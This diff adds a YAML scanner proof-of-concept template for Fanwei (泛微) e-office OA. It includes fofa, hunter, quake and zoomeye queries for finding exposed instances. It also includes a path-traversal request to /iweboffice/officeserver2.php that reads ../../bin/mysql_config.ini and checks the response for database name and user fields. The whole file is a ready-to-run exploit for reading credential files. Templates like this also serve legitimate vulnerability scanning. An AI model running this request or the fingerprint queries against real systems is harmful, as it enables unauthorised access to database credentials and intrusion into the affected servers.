@@ -1,0 +1,37 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="泛微-EOffice"
+    hunter-query: app.name=="泛微 e-office OA"
+    quake-query: app:"泛微 E-Office"
+    zoomeye-query: app:"泛微协同办公标准产品EOffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-fanwei-e-office-iweboffice-fileread
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s2: randomLowercase(8)
+  s1: randomInt(10000,99999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini 
+      follow_redirects: false
+      headers: 
+      body: 
+    expression: >-
+      response.body_string.contains("dataname") && response.body_string.contains("datauser")
+
+    output:
+      search: |-
+        "(?P<token>\\w+)".bsubmatch(response.body)
+      token: search["token"]
+
+expression: r0() 
